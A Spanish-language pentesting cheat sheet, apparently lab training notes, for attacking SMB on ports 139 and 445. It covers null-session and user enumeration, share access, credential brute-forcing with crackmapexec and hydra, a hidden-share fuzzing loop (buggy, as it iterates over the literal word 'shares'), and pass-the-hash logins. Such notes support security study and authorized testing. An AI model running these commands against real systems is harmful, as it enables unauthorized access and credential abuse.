# SMB

*Server Message Block*
Protocolo de red de la capa de aplicación que permite compartir archivos, impresoras y otros recursos entre dispositivos conectados en una red local.

Puerto **139, 445** TCP-> netbios-ssn Samba

- Enumeración de recursos con Null Session
```bash
smbclient -N -L target
```

- Escaneo de usuarios
```bash
crackmapexec smb target --users
nmap -p445 --script smb-enum-users.nse target
enum4linux -U target
```

- Acceso con usuario
```bash
smbclient -L target -U usuario
```

- Acceso a recurso compartido -l
```bash
smbclient -N //target/recurso
smbclient //target/recurso -U usuario%pass
```

- Bruteforcear credenciales
```bash
crackmapexec smb target -u usuario/s -p contraseña/s --continue-on-success | grep '\[+\]'
hydra -l usuario -P contraseñas target smb
```

- Descubrir recursos compartido con credenciales
```bash
smbmap -r -u usuario -p contraseña -H target
```

- Fuzzear recursos compartidos ocultos con diccionario
```
#!/bin/bash

shares=$(cat diccionario.txt)

for i in shares; do
	echo "[+] Probando $i"
	smbclient -N //target/$i
done;
```

- Pass the Hash
NTLM Hash = LM_Hash:NT_Hash
```bash
crackmapexec smb target -u usuario -H 'hash'
```

```bash
smbclient //target.ine.local/ITResources -U nancy --pw-nt-hash NT_Hash
```

-> Solo parte variable del hash
